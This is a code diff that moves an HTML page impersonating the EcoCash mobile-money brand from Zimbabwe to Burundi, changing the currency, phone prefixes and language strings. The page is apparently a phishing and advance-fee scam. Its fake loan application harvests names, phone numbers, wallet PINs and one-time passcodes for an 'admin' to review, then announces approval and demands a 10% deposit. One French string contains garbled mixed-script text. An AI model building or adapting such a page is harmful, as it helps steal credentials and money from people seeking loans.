@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>EcoCash Zimbabwe – Quick & Easy Loans</title>
+<title>EcoCash Burundi – Quick & Easy Loans</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
 <style>
@@ -285,8 +285,8 @@
         </button>
         <div class="lang-dropdown-menu" id="langDropdownMenu">
           <button class="lang-option active" onclick="setLanguage('en')">🇬🇧 English</button>
-          <button class="lang-option" onclick="setLanguage('sn')">🇿🇼 Shona</button>
-          <button class="lang-option" onclick="setLanguage('nd')">🇿🇼 Ndebele</button>
+          <button class="lang-option" onclick="setLanguage('fr')">🇫🇷 Français</button>
+          <button class="lang-option" onclick="setLanguage('rn')">🇧🇮 Kirundi</button>
         </div>
       </div>
       <div class="brand-nav-right" onclick="goTo('page-login')" data-i18n="nav_signin">Sign In</div>
@@ -300,15 +300,15 @@
 
       <div class="calc-box">
         <h2 data-i18n="calc_title">Loan Calculator</h2>
-        <div class="calc-row2"><span data-i18n="calc_amt">Loan Amount</span><span class="cv" id="aDisp">$1,000</span></div>
-        <input type="range" id="rA" min="50" max="10000" step="50" value="1000" oninput="calcUp()" style="--pct:9.5%">
-        <div class="range-ends"><span>$50</span><span>$10,000</span></div>
+        <div class="calc-row2"><span data-i18n="calc_amt">Loan Amount</span><span class="cv" id="aDisp">FBu 1,000,000</span></div>
+        <input type="range" id="rA" min="50000" max="10000000" step="50000" value="1000000" oninput="calcUp()" style="--pct:9.5%">
+        <div class="range-ends"><span>FBu 50,000</span><span>FBu 10,000,000</span></div>
         <div class="calc-row2"><span data-i18n="calc_term">Loan Term</span><span class="cv" id="tDisp">12 months</span></div>
         <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
         <div class="range-ends"><span data-i18n="calc_6m">6 months</span><span data-i18n="calc_60m">60 months</span></div>
         <div class="monthly-box">
           <span class="ml" data-i18n="calc_monthly">Monthly Payment</span>
-          <span class="ma" id="mOut">$88.85</span>
+          <span class="ma" id="mOut">FBu 88,850</span>
         </div>
       </div>
 
@@ -323,14 +323,14 @@
   </div>
 
   <div id="popup" class="live-popup">
-      <div class="popup-avatar" id="popup-avatar">ZW</div>
+      <div class="popup-avatar" id="popup-avatar">BI</div>
       <div class="popup-content">
           <div id="popup-text" class="popup-text"></div>
           <div id="popup-time" class="popup-time">Just now</div>
       </div>
   </div>
 
-  <div class="pg-footer">© 2026 EcoCash Zimbabwe</div>
+  <div class="pg-footer">© 2026 EcoCash Burundi</div>
 </div>
 
 <!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
@@ -353,13 +353,13 @@
       <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
       <div class="msg-box error" id="s1Err"><i class="fa-solid fa-circle-xmark"></i><span id="s1ErrTxt"></span></div>
       <div class="field"><label data-i18n="field_loan_type">Loan Type</label><div class="sel-wrap"><select id="s1ty"><option data-i18n="opt_personal">Personal Loan</option><option selected data-i18n="opt_business">Business Loan</option><option data-i18n="opt_home">Home Loan</option><option data-i18n="opt_car">Car Loan</option><option data-i18n="opt_edu">Education Loan</option></select></div></div>
-      <div class="field"><label data-i18n="field_loan_amt">Loan Amount ($)</label><input type="number" id="s1am" value="1000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
+      <div class="field"><label data-i18n="field_loan_amt">Loan Amount (FBu)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount" oninput="clearErr('s1Err')"></div>
       <div class="field"><label data-i18n="field_loan_term">Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option>36 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
       <div class="field"><label data-i18n="field_purpose">Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
       <button class="btn-grad" onclick="toS2()" data-i18n="btn_next">NEXT STEP</button>
     </div>
   </div>
-  <div class="pg-footer">© 2026 EcoCash Zimbabwe</div>
+  <div class="pg-footer">© 2026 EcoCash Burundi</div>
 </div>
 
 <!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
@@ -387,8 +387,8 @@
       </div>
       <div class="field">
         <label data-i18n="field_phone">Phone Number</label>
-        <div class="phone-row"><div class="ph-pre">+263</div><input type="tel" id="s2ph" placeholder="771234567" maxlength="9" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint" data-i18n="phone_hint">Enter 9 digits for Zimbabwe (e.g. 77... or 78...)</div>
+        <div class="phone-row"><div class="ph-pre">+257</div><input type="tel" id="s2ph" placeholder="71234567" maxlength="8" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
+        <div class="field-hint" data-i18n="phone_hint">Enter 8 digits for Burundi (e.g. 71... or 72...)</div>
       </div>
       
       <div class="step-btns">
@@ -397,7 +397,7 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 EcoCash Zimbabwe</div>
+  <div class="pg-footer">© 2026 EcoCash Burundi</div>
 </div>
 
 <!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
@@ -420,10 +420,10 @@
       <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
       <div class="msg-box error" id="s3Err"><i class="fa-solid fa-circle-xmark"></i><span id="s3ErrTxt"></span></div>
       <div class="field"><label data-i18n="field_emp_status">Employment Status</label><div class="sel-wrap"><select id="s3em"><option data-i18n="emp_employed">Employed</option><option selected data-i18n="emp_self">Self-Employed</option><option data-i18n="emp_unemployed">Unemployed</option><option data-i18n="emp_retired">Retired</option><option data-i18n="emp_student">Student</option></select></div></div>
-      <div class="field"><label data-i18n="field_annual_income">Annual Income ($)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
+      <div class="field"><label data-i18n="field_annual_income">Annual Income (FBu)</label><input type="number" id="s3in" placeholder="Enter annual income" oninput="clearErr('s3Err')"></div>
       <div class="sum-box">
         <h3 data-i18n="sum_title">Application Summary</h3>
-        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Loan Amount:</span><span class="sv" id="sA">$1,000</span></div>
+        <div class="sum-row"><span class="sk" data-i18n="sum_amt">Loan Amount:</span><span class="sv" id="sA">FBu 1,000,000</span></div>
         <div class="sum-row"><span class="sk" data-i18n="sum_term">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
         <div class="sum-row"><span class="sk" data-i18n="sum_purpose">Purpose:</span><span class="sv" id="sP">—</span></div>
         <div class="sum-row"><span class="sk" data-i18n="sum_applicant">Applicant:</span><span class="sv" id="sN">—</span></div>
@@ -439,11 +439,11 @@
       <p class="footer-instruction">To register an EcoCash wallet or get assistance, click below</p>
       
       <div class="footer-buttons">
-          <a href="https://partnerapplications.ecocash.co.zw/signup" target="_blank" rel="noopener noreferrer" class="footer-btn">
+          <a href="https://www.econet.bi" target="_blank" rel="noopener noreferrer" class="footer-btn">
               <i class="fa-solid fa-user-plus"></i>
               <span>Register</span>
           </a>
-          <a href="https://ecocash.co.zw/contact-us" target="_blank" rel="noopener noreferrer" class="footer-btn">
+          <a href="https://www.econet.bi" target="_blank" rel="noopener noreferrer" class="footer-btn">
               <i class="fa-solid fa-headset"></i>
               <span>Help & Support</span>
           </a>
@@ -452,7 +452,7 @@
       <div class="footer-meta">
           <div class="footer-version">v2.1.3P</div>
           <div class="footer-terms">By signing in you agree to the <a href="#">Terms and Conditions</a></div>
-          <div style="font-size: 0.72rem; opacity: 0.6; margin-top: 4px;">&copy; 2026 EcoCash Zimbabwe</div>
+          <div style="font-size: 0.72rem; opacity: 0.6; margin-top: 4px;">&copy; 2026 EcoCash Burundi</div>
       </div>
   </footer>
 </div>
@@ -487,8 +487,8 @@
       <div class="msg-box error" id="lgMsg"><i class="fa-solid fa-circle-xmark"></i><span id="lgMsgTxt"></span></div>
 
       <div class="lg-phone-row">
-        <div class="lg-ph-pre">🇿🇼 +263</div>
-        <input type="tel" id="lgPh" placeholder="771234567" maxlength="9" oninput="normalizePhone('lgPh');chkLogin()">
+        <div class="lg-ph-pre">🇧🇮 +257</div>
+        <input type="tel" id="lgPh" placeholder="71234567" maxlength="8" oninput="normalizePhone('lgPh');chkLogin()">
       </div>
       <div class="pin-label" data-i18n="login_pin_lbl">Enter your PIN (4 characters)</div>
       <div class="pin-row">
@@ -531,7 +531,7 @@
     <div class="otp-card">
       <h2 data-i18n="otp_h2">OTP Verification</h2>
       <p class="otp-hint" data-i18n="otp_hint">Enter the 6-digit OTP sent to your phone number</p>
-      <div class="otp-phone" id="otpPh">+263771234567</div>
+      <div class="otp-phone" id="otpPh">+25771234567</div>
 
       <div class="msg-box error"   id="otpMsgErr"><i class="fa-solid fa-circle-xmark"></i><span id="otpMsgErrTxt"></span></div>
       <div class="msg-box success" id="otpMsgOk"><i class="fa-solid fa-circle-check"></i><span id="otpMsgOkTxt"></span></div>
@@ -556,7 +556,7 @@
       </div>
     </div>
   </div>
-  <div class="pg-footer">© 2026 EcoCash Zimbabwe</div>
+  <div class="pg-footer">© 2026 EcoCash Burundi</div>
 </div>
 
 <!-- ══════════════════════ PAGE 8: APPROVAL ══════════════════════ -->
@@ -566,7 +566,7 @@
       <div class="check-circle"><i class="fa-solid fa-check"></i></div>
       <div class="appr-title" data-i18n="appr_congrats">🎉 Congratulations!</div>
       <div class="appr-sub"><span data-i18n="appr_sub1">Your loan has been</span> <strong data-i18n="appr_approved">approved!</strong> <span data-i18n="appr_sub2">The funds will be disbursed shortly.</span></div>
-      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">APPROVED AMOUNT</div><div class="aba" id="apAmt">$1,000</div></div>
+      <div class="appr-banner"><div class="abl" data-i18n="appr_banner_lbl">APPROVED AMOUNT</div><div class="aba" id="apAmt">FBu 1,000,000</div></div>
     </div>
     <div class="comp-box">
       <div class="ch" data-i18n="comp_notice"><i class="fa-solid fa-triangle-exclamation"></i> COMPLIANCE NOTICE</div>
@@ -574,7 +574,7 @@
     </div>
     <div class="ld-card">
       <div class="ld-htitle" data-i18n="ld_title"><i class="fa-regular fa-credit-card"></i> Loan Details</div>
-      <div class="ld-row"><div class="ld-icon ic-g"><i class="fa-solid fa-wallet"></i></div><div><div class="ld-lbl" data-i18n="ld_monthly">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">$27.50</div></div></div>
+      <div class="ld-row"><div class="ld-icon ic-g"><i class="fa-solid fa-wallet"></i></div><div><div class="ld-lbl" data-i18n="ld_monthly">MONTHLY PAYMENT</div><div class="ld-val" id="apMthly">FBu 27,500</div></div></div>
       <div class="ld-row"><div class="ld-icon ic-b"><i class="fa-regular fa-calendar"></i></div><div><div class="ld-lbl" data-i18n="ld_term">LOAN TERM</div><div class="ld-val" id="apTerm">48 Months</div></div></div>
       <div class="ld-row"><div class="ld-icon ic-p"><i class="fa-solid fa-chart-line"></i></div><div><div class="ld-lbl" data-i18n="ld_interest">INTEREST RATE</div><div class="ld-val">12% APR</div></div></div>
     </div>
@@ -604,7 +604,7 @@
 </div>
 
 <script>
-  // LOCALIZATION DICTIONARIES
+  // LOCALIZATION DICTIONARIES (Burundi: English, French, Kirundi)
   const translations = {
     en: {
       lang_label: "🌐 English",
@@ -639,7 +639,7 @@
       opt_home: "Home Loan",
       opt_car: "Car Loan",
       opt_edu: "Education Loan",
-      field_loan_amt: "Loan Amount ($)",
+      field_loan_amt: "Loan Amount (FBu)",
       field_loan_term: "Loan Term",
       field_purpose: "Purpose of Loan",
       btn_next: "NEXT STEP",
@@ -647,14 +647,14 @@
       field_fname: "First Name",
       field_lname: "Last Name",
       field_phone: "Phone Number",
-      phone_hint: "Enter 9 digits for Zimbabwe (e.g. 77... or 78...)",
+      phone_hint: "Enter 8 digits for Burundi (e.g. 71... or 72...)",
       field_emp_status: "Employment Status",
       emp_employed: "Employed",
       emp_self: "Self-Employed",
       emp_unemployed: "Unemployed",
       emp_retired: "Retired",
       emp_student: "Student",
-      field_annual_income: "Annual Income ($)",
+      field_annual_income: "Annual Income (FBu)",
       sum_title: "Application Summary",
       sum_amt: "Loan Amount:",
       sum_term: "Loan Term:",
@@ -703,199 +703,199 @@
       modal_submitting: "Submitting Application…",
       modal_processing: "Please wait while we process your application"
     },
-    sn: {
-      lang_label: "🌐 Shona",
-      lbl_financial_services: "Masevhisi E mari",
-      lbl_loan_app: "Kumbira Chikwereti",
-      lbl_secure_portal: "Nzvimbo Yakachengeteka",
-      lbl_security_ver: "Kutarisa Kuchengeteka",
-      nav_signin: "Pinda",
-      nav_home: "Kumba",
-      nav_back: "Shure",
-      land_h1: "Wana Chikwereti Chako Chakabvumirwa Nekukurumidza",
-      land_sub: "Kubvumirwa nekukurumidza • Ribha shoma • Mitemo iri nyore",
-      calc_title: "Verenga Chikwereti",
-      calc_amt: "Mari Yechikwereti",
-      calc_term: "Nguva Yechikwereti",
-      calc_6m: "mwedzi 6",
-      calc_60m: "mwedzi 60",
-      calc_monthly: "Mari Yemwedzi Rega Rega",
-      btn_apply_now: "KUMBIRA ZVESANGANO",
-      feat_fast: "Kubvumirwa Kukurumidza",
-      feat_fast_sub: "Mukati mem maawa 24",
-      feat_rates: "Ribha Shoma",
-      feat_rates_sub: "Kubva pa 12%",
-      feat_secure: "Yakachengeteka",
-      feat_secure_sub: "Pasi pemabhangi",
-      step_1_sub: "Nhanho 1 kubva pa 3",
-      step_2_sub: "Nhanho 2 kubva pa 3",
-      step_3_sub: "Nhanho 3 kubva pa 3",
-      field_loan_type: "Mhando Yechikwereti",
-      opt_personal: "Chikwereti Chega",
-      opt_business: "Chikwereti Chebhizinesi",
-      opt_home: "Chikwereti Chemba",
-      opt_car: "Chikwereti Chemota",
-      opt_edu: "Chikwereti Chokudzidza",
-      field_loan_amt: "Mari Yechikwereti ($)",
-      field_loan_term: "Nguva Yechikwereti",
-      field_purpose: "Chinangwa Chechikwereti",
-      btn_next: "NHANHO INOTEVERA",
-      btn_prev: "ZVAPFUURA",
-      field_fname: "Zita Rokutanga",
-      field_lname: "Zita Rokupedzisira",
-      field_phone: "Nhamba Yenhare",
-      phone_hint: "Isa nhamba 9 dzeZimbabwe",
-      field_emp_status: "Basa Ramunoshanda",
-      emp_employed: "Ndinoshanda",
-      emp_self: "Ndinozvishandira",
-      emp_unemployed: "Handina Basa",
-      emp_retired: "Ndakarega Basa",
-      emp_student: "Mudzidzi",
-      field_annual_income: "Mari Inopinda Pagore ($)",
-      sum_title: "Pfupiso Yechikumbiro",
-      sum_amt: "Mari Yechikwereti:",
-      sum_term: "Nguva Yechikwereti:",
-      sum_purpose: "Chinangwa:",
-      sum_applicant: "Anoromba:",
-      btn_submit: "TUMIRA CHIKUMBIRO",
-      sub_title: "Chikumbiro Chatumirwa",
-      sub_desc: "Chikumbiro chako chechikwereti chatumirwa. Ndapota mirira kubvumirwa.<br>Uchatambira meseji yekusimbisa. Parizvino, pinda muEcoCash.",
-      sub_redirect: "Inokuendesa kuEcoCash mukati me",
-      sub_btn_login: "Pinda Zvino",
-      login_h2: "Pinda muAkaunti",
-      login_pin_lbl: "Isa PIN yako (mavara 4)",
-      login_forgot: "Wakangwa PIN?",
-      login_btn: "PINDA",
-      terms_text: "Nokuinda munzvimbo ino unobvumirana ne",
-      terms_link: "Mitemo neMamiriro",
-      otp_h2: "Kusimbisa ne OTP",
-      otp_hint: "Isa OTP yemadhijitiri 6 yakatumirwa kunhare yako",
-      otp_waiting: "Kumirira ADMIN kuti atonge mashoko enyu…",
-      otp_resend_in: "Tumira zvakare kodhi mushure me",
-      otp_seconds: "seconds",
-      otp_submit: "TUMIRA",
-      appr_congrats: "🎉 Makorokoto!",
-      appr_sub1: "Chikwereti chako",
-      appr_approved: "chabvumirwa!",
-      appr_sub2: "Mari ichaburitswa munguva pfupi.",
-      appr_banner_lbl: "MARI YAKABVUMIRWA",
-      comp_notice: "CHERECHEDZO",
-      comp_text1: "Akaunti yako yeEcoCash inofanira kuva yakabatidzwa uye iine mari inochengetedza ingangoita",
-      comp_text2: "10% yemari yechikwereti chawakakumbira.",
-      comp_text3: "Mari iyi inodzorerwa yakazara kana wapedza kubhadhara chikwereti.",
-      ld_title: "Mashoko Echikwereti",
-      ld_monthly: "MARI YEMWEDZI",
-      ld_term: "NGUVA YECHIKWERETI",
-      ld_interest: "RIBHA",
-      qa_title: "Zvokuita Nekukurumidza",
-      qa_deposit: "Isa Mari",
-      qa_withdraw: "Tora Mari",
-      qa_details: "Mashoko Echikwereti",
-      nxt_title: "Matanho Anotevera:",
-      nxt_desc: "Uchatambira SMS ine mashoko mukati memaawa 24.",
-      rth_btn: "Dzokera Kumba",
-      modal_wait: "Ndapota mirira…",
-      modal_sending: "Kutumira mashoko enyu kuti atariswe",
-      modal_verifying_otp: "Kusimbisa OTP",
-      modal_submitting: "Kutumira Chikumbiro…",
-      modal_processing: "Ndapota mirira tichigadzirisa chikumbiro chako"
+    fr: {
+      lang_label: "🌐 Français",
+      lbl_financial_services: "Services Financiers",
+      lbl_loan_app: "Demande de Prêt",
+      lbl_secure_portal: "Port পোর্ট Sécurisé",
+      lbl_security_ver: "Vérification de Sécurité",
+      nav_signin: "Connexion",
+      nav_home: "Accueil",
+      nav_back: "Retour",
+      land_h1: "Obtenez Votre Prêt Rapidement",
+      land_sub: "Approbation rapide • Taux compétitifs • Termes flexibles",
+      calc_title: "Calculateur de Prêt",
+      calc_amt: "Montant du Prêt",
+      calc_term: "Durée du Prêt",
+      calc_6m: "6 mois",
+      calc_60m: "60 mois",
+      calc_monthly: "Paiement Mensuel",
+      btn_apply_now: "DEMANDER MAINTENANT",
+      feat_fast: "Approbation Rapide",
+      feat_fast_sub: "Sous 24 heures",
+      feat_rates: "Bas Taux",
+      feat_rates_sub: "À partir de 12%",
+      feat_secure: "Sécurisé",
+      feat_secure_sub: "Niveau bancaire",
+      step_1_sub: "Étape 1 sur 3",
+      step_2_sub: "Étape 2 sur 3",
+      step_3_sub: "Étape 3 sur 3",
+      field_loan_type: "Type de Prêt",
+      opt_personal: "Prêt Personnel",
+      opt_business: "Prêt Professionnel",
+      opt_home: "Prêt Immobilier",
+      opt_car: "Prêt Auto",
+      opt_edu: "Prêt Éducation",
+      field_loan_amt: "Montant du Prêt (FBu)",
+      field_loan_term: "Durée du Prêt",
+      field_purpose: "Motif du Prêt",
+      btn_next: "ÉTAPE SUIVANTE",
+      btn_prev: "PRÉCÉDENT",
+      field_fname: "Prénom",
+      field_lname: "Nom",
+      field_phone: "Numéro de Téléphone",
+      phone_hint: "Entrez 8 chiffres pour le Burundi (ex: 71... ou 72...)",
+      field_emp_status: "Situation Professionnelle",
+      emp_employed: "Salarié",
+      emp_self: "Indépendant",
+      emp_unemployed: "Sans emploi",
+      emp_retired: "Retraité",
+      emp_student: "Étudiant",
+      field_annual_income: "Revenu Annuel (FBu)",
+      sum_title: "Résumé de la Demande",
+      sum_amt: "Montant du Prêt:",
+      sum_term: "Durée du Prêt:",
+      sum_purpose: "Motif:",
+      sum_applicant: "Demandeur:",
+      btn_submit: "SOUMETTRE LA DEMANDE",
+      sub_title: "Demande Soumise",
+      sub_desc: "Votre demande de prêt a été soumise. Veuillez patienter pour l'approbation.<br>Vous recevrez un message de confirmation. Connectez-vous à EcoCash.",
+      sub_redirect: "Redirection vers la connexion EcoCash dans",
+      sub_btn_login: "Aller à la connexion",
+      login_h2: "Connexion au Compte",
+      login_pin_lbl: "Entrez votre PIN (4 caractères)",
+      login_forgot: "Code PIN oublié ?",
+      login_btn: "SE CONNECTER",
+      terms_text: "En vous connectant, vous acceptez les",
+      terms_link: "Termes et Conditions",
+      otp_h2: "Vérification OTP",
+      otp_hint: "Entrez le code OTP à 6 chiffres envoyé sur votre numéro",
+      otp_waiting: "En attente de la vérification par l'administrateur…",
+      otp_resend_in: "Renvoyer le code dans",
+      otp_seconds: "secondes",
+      otp_submit: "SOUMETTRE",
+      appr_congrats: "🎉 Félicitations !",
+      appr_sub1: "Votre prêt a été",
+      appr_approved: "approuvé !",
+      appr_sub2: "Les fonds seront décaissés sous peu.",
+      appr_banner_lbl: "MONTANT APPROUVÉ",
+      comp_notice: "AVIS DE CONFORMITÉ",
+      comp_text1: "Votre compte EcoCash doit être actif et maintenir un dépôt de garantie d'au moins",
+      comp_text2: "10% du montant demandé.",
+      comp_text3: "Ce dépôt est entièrement remboursable après le remboursement du prêt.",
+      ld_title: "Détails du Prêt",
+      ld_monthly: "PAIEMENT MENSUEL",
+      ld_term: "DURÉE DU PRÊT",
+      ld_interest: "TAUX D'INTÉRÊT",
+      qa_title: "Actions Rapides",
+      qa_deposit: "Déposer des Fonds",
+      qa_withdraw: "Retirer des Fonds",
+      qa_details: "Détails du Prêt",
+      nxt_title: "Prochaines Étapes :",
+      nxt_desc: "Vous recevrez un SMS avec les détails du décaissement sous 24 heures.",
+      rth_btn: "Retour à l'Accueil",
+      modal_wait: "Veuillez patienter…",
+      modal_sending: "Envoi de vos informations pour vérification",
+      modal_verifying_otp: "Vérification de l'OTP",
+      modal_submitting: "Soumission de la demande…",
+      modal_processing: "Veuillez patienter pendant le traitement"
     },
-    nd: {
-      lang_label: "🌐 Ndebele",
-      lbl_financial_services: "Inkonzo Zezezimali",
-      lbl_loan_app: "Isicelo Semali",
-      lbl_secure_portal: "Isango Elivikelekileyo",
-      lbl_security_ver: "Ukuqinisekisa Ukuvikeleka",
-      nav_signin: "Ngena",
-      nav_home: "Ekhaya",
-      nav_back: "Emuva",
-      land_h1: "Thola Imali Yakho Ivunyelwe Masinyane",
-      land_sub: "Ukuvunywa masinyane • Inzalo ephansi • Imibandela elula",
-      calc_title: "Isibali Semali",
-      calc_amt: "Inani Lemali",
-      calc_term: "Isikhathi Semali",
-      calc_6m: "izinyanga eziyisithupha",
-      calc_60m: "izinyanga ezingamashumi ayisithupha",
-      calc_monthly: "Inkokhelo Ngenyanga",
-      btn_apply_now: "CELA MANJE",
-      feat_fast: "Ukuvunywa Okusheshayo",
-      feat_fast_sub: "Ngaphakathi kwamahora angu-24",
-      feat_rates: "Inzalo Ephansi",
-      feat_rates_sub: "Kusukela ku-12%",
-      feat_secure: "Kuvikelekile",
-      feat_secure_sub: "Okusezingeni lebhange",
-      step_1_sub: "Isinyathelo 1 kwezi-3",
-      step_2_sub: "Isinyathelo 2 kwezi-3",
-      step_3_sub: "Isinyathelo 3 kwezi-3",
-      field_loan_type: "Uhlobo Lwemali",
-      opt_personal: "Imali Yomuntu",
-      opt_business: "Imali Yebhizinisi",
-      opt_home: "Imali Yendlu",
-      opt_car: "Imali Yemota",
-      opt_edu: "Imali Yemfundo",
-      field_loan_amt: "Inani Lemali ($)",
-      field_loan_term: "Isikhathi Semali",
-      field_purpose: "Inhloso Yemali",
-      btn_next: "ISINYATHELO ESILELANDELAYO",
-      btn_prev: "OKWDLULEYO",
-      field_fname: "Igama Lokuqala",
-      field_lname: "Isibongo",
-      field_phone: "Inombolo Yocingo",
-      phone_hint: "Faka izinombolo ezingu-9 zeZimbabwe",
-      field_emp_status: "Isimo Somsebenzi",
-      emp_employed: "Ngiyasebenza",
-      emp_self: "Ngiyazisebenzela",
-      emp_unemployed: "Angisebenzi",
-      emp_retired: "Ngithathe umhlalaphansi",
-      emp_student: "NgiyiNqobi",
-      field_annual_income: "Imali Engenayo Ngonyaka ($)",
-      sum_title: "Isifinqo Sesicelo",
-      sum_amt: "Inani Lemali:",
-      sum_term: "Isikhathi Semali:",
-      sum_purpose: "Inhloso:",
-      sum_applicant: "Ofake Isicelo:",
-      btn_submit: "THUMELA ISICELO",
-      sub_title: "Isicelo Sesithunywe",
-      sub_desc: "Isicelo sakho semali sithunyelwe. Sicela ulinde ukuvunywa.<br>Uzathola umyalezo wokuqinisekisa. Manje, ngena ku-EcoCash.",
-      sub_redirect: "Iya ekungeneni kwe-EcoCash ngoku",
-      sub_btn_login: "Ngena Manje",
-      login_h2: "Ukungena Ku-akhawunti",
-      login_pin_lbl: "Faka i-PIN yakho (izinhlamvu ezingu-4)",
-      login_forgot: "Ukhohlwe i-PIN?",
-      login_btn: "NGENA",
-      terms_text: "Ngokungena uyavumelana",
-      terms_link: "Nemibandela",
-      otp_h2: "Ukuqinisekisa nge-OTP",
-      otp_hint: "Faka i-OTP yamadijithi angu-6 ethunyelwe efonini yakho",
-      otp_waiting: "Kulindwe umlawuli ukuthi aqinisekise imininingwane yakho…",
-      otp_resend_in: "Thumela ikhodi futhi ngemuva kwe",
-      otp_seconds: "imizuzwana",
-      otp_submit: "THUMELA",
-      appr_congrats: "🎉 Siyakubhalela!",
-      appr_sub1: "Imali yakho",
-      appr_approved: "ivunyelwe!",
-      appr_sub2: "Imali izokhishwa maduze.",
-      appr_banner_lbl: "INANI ELIVUNYELWEYO",
-      comp_notice: "ISAZISO SOKUTHOBELA",
-      comp_text1: "I-akhawunti yakho ye-EcoCash kumele ibe sebenzayo futhi ibe lediphozithi yokuvikela okungenani",
-      comp_text2: "10% yenani lemali oyicelileyo.",
-      comp_text3: "Le diphozithi ibuyiswa ngokuphelele nxa ukhokhe kuhle.",
-      ld_title: "Imininingwane Yemali",
-      ld_monthly: "INKOKHELO NGENYANGA",
-      ld_term: "ISIKHATHI SEMALI",
-      ld_interest: "INZALO",
-      qa_title: "Izenzo Ezisheshayo",
-      qa_deposit: "Faka Imali",
-      qa_withdraw: "Khipha Imali",
-      qa_details: "Imininingwane Yemali",
-      nxt_title: "Amanyathelo Amlandelayo:",
-      nxt_desc: "Uzathola i-SMS enemininingwane kungakapheli amahora angu-24.",
-      rth_btn: "Buyela Ekhaya",
-      modal_wait: "Sicela ulinde…",
-      modal_sending: "Kuthunyelwa imininingwane yakho ukuze iqinisekiswe",
-      modal_verifying_otp: "Kuqinisekiswa i-OTP",
-      modal_submitting: "Kuthunyelwa Isicelo…",
-      modal_processing: "Sicela ulinde sikhangele isicelo sakho"
+    rn: {
+      lang_label: "🇧🇮 Kirundi",
+      lbl_financial_services: "Serivisi z'Amahera",
+      lbl_loan_app: "Gusaba Inguzanyo",
+      lbl_secure_portal: "Urutonde Rwizewe",
+      lbl_security_ver: "Kugenzura Umutekano",
+      nav_signin: "Injira",
+      nav_home: "Ahatangira",
+      nav_back: "Inyuma",
+      land_h1: "Bonerako Inguzanyo Yawe Vuba",
+      land_sub: "Kwemerwa vuba • Inyungu nto • Amataliki yoroshe",
+      calc_title: "Umuvuzi w'Inguzanyo",
+      calc_amt: "Ingano y'Inguzanyo",
+      calc_term: "Ikiringo c'Inguzanyo",
+      calc_6m: "amezi 6",
+      calc_60m: "amezi 60",
+      calc_monthly: "Ukwishyura kw'Ukwezi",
+      btn_apply_now: "SABA UBU",
+      feat_fast: "Kwemerwa Vuba",
+      feat_fast_sub: "Mu masaha 24",
+      feat_rates: "Inyungu Nto",
+      feat_rates_sub: "Kuva kuri 12%",
+      feat_secure: "Bizewe",
+      feat_secure_sub: "Urukingo rw'ibanki",
+      step_1_sub: "Intambwe 1 kuri 3",
+      step_2_sub: "Intambwe 2 kuri 3",
+      step_3_sub: "Intambwe 3 kuri 3",
+      field_loan_type: "Ubwoko bw'Inguzanyo",
+      opt_personal: "Inguzanyo y'Umuntu",
+      opt_business: "Inguzanyo y'Ubucuruzi",
+      opt_home: "Inguzanyo y'Inzu",
+      opt_car: "Inguzanyo y'Imodoka",
+      opt_edu: "Inguzanyo y'Amashuri",
+      field_loan_amt: "Ingano y'Inguzanyo (FBu)",
+      field_loan_term: "Ikiringo c'Inguzanyo",
+      field_purpose: "Igitumye usaba Inguzanyo",
+      btn_next: "INTAMBWE IKURIKIRA",
+      btn_prev: "IVYAHISE",
+      field_fname: "Izina ry'Imbere",
+      field_lname: "Izina ry'Umuvyeyi",
+      field_phone: "Nimero ya Terefone",
+      phone_hint: "Injiza nimero 8 z'u Burundi (urugero: 71... cyangwa 72...)",
+      field_emp_status: "Uko ukora akazi",
+      emp_employed: "Narakora",
+      emp_self: "Ndikorera",
+      emp_unemployed: "Nta kazi",
+      emp_retired: "Naruhutse akazi",
+      emp_student: "Umunyeshuri",
+      field_annual_income: "Amahera yinjira mu mwaka (FBu)",
+      sum_title: "Incamake y'Ubusabe",
+      sum_amt: "Ingano y'Inguzanyo:",
+      sum_term: "Ikiringo:",
+      sum_purpose: "Igitumye:",
+      sum_applicant: "Uwasavye:",
+      btn_submit: "TUMIRA UBUSABE",
+      sub_title: "Ubusabe bw'Inguzanyo Bwatanzwe",
+      sub_desc: "Ubusabe bwawe bwaratanzwe. Tegereza ko bwemezwa.<br>Uzoronka ubutumwa bwemeza. Ubu rero, injira muri EcoCash.",
+      sub_redirect: "Gutwara kuri EcoCash muri",
+      sub_btn_login: "Injira Ubu",
+      login_h2: "Kwinjira muri Konti",
+      login_pin_lbl: "Injiza PIN yawe (ibimenyetso 4)",
+      login_forgot: "Wibagiye PIN?",
+      login_btn: "INJIRA",
+      terms_text: "Nukwinjira wemera",
+      terms_link: "Amasezerano n'Amategeko",
+      otp_h2: "Kugenzura OTP",
+      otp_hint: "Injiza OTP y'ibimenyetso 6 yoherejwe kuri terefone yawe",
+      otp_waiting: "Tegereza umuyobozi kugira ngo agenzure ibyawe…",
+      otp_resend_in: "Subira woherereze kode mu",
+      otp_seconds: "amasegonda",
+      otp_submit: "TUMIRA",
+      appr_congrats: "🎉 Turakengurukira!",
+      appr_sub1: "Inguzanyo yawe",
+      appr_approved: "yemejwe!",
+      appr_sub2: "Amahera azosohorwa vuba.",
+      appr_banner_lbl: "INGANO YEMEJWE",
